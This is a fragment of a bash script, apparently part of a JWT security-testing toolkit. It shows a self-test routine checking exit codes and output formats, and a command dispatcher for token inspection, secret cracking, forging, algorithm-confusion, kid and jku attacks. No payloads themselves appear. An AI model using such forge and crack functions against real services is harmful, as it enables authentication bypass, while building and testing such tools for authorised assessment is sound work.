    jw_cmd_check "notatoken" >/dev/null 2>&1; chk check-opaque "$?" "1"
    local chkout; chkout="$(jw_cmd_check "$tok" 2>/dev/null)"
    chk check-val      "$(printf '%s' "$chkout" | awk -F'\t' '$1=="CHECK"{print $2}')" "jws"

    # usage errors, not crashes
    jw_cmd_crack 2>/dev/null; chk crack-usage "$?" "2"
    jw_cmd_forge 2>/dev/null; chk forge-usage "$?" "2"
    jw_cmd_alg 2>/dev/null;   chk alg-usage   "$?" "2"
    jw_cmd_forge '{"a":1}' bogus 2>/dev/null; chk forge-bogus "$?" "2"

    # a dead endpoint is unreachable, not a hit
    local aout; aout="$(JW_TIMEOUT=1 jw_cmd_alg http://127.0.0.1:9 "$tok" 2>/dev/null)"
    chk alg-dead       "$(printf '%s' "$aout" | awk -F'\t' '$1=="VERDICT"{print $2}')" "unreachable"

    # shape contracts
    chk status-fields  "$(jw_cmd_status_tsv | awk -F'\t' '{print NF}')" "4"
    chk status-module  "$(jw_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields    "$(jw_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first     "$(jw_cmd_help | head -1 | grep -ci 'JWT')" "1"
    chk list-count     "$(jw_cmd_list | grep -c '^ATTACK')" "8"
    chk kid-count      "$(jw_cmd_kid 2>/dev/null | grep -c '^KID_PAYLOAD')" "7"

    rm -f "$pem" "$pem.pub" 2>/dev/null
    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --inspect)  shift; jw_cmd_inspect "$@";;
    --claims)   shift; jw_cmd_claims "$@";;
    --crack)    shift; jw_cmd_crack "$@";;
    --forge)    shift; jw_cmd_forge "$@";;
    --alg)      shift; jw_cmd_alg "$@";;
    --kid)      shift; jw_cmd_kid "$@";;
    --jku)      shift; jw_cmd_jku "$@";;
    --keys)     shift; jw_cmd_keys "$@";;
    --check)    shift; jw_cmd_check "$@";;
    --list)     jw_cmd_list;;
    --status-tsv|--status) jw_cmd_status_tsv;;
    --menu)     jw_cmd_menu;;
    --selftest) jw_selftest;;
    *)          jw_cmd_help;;
esac
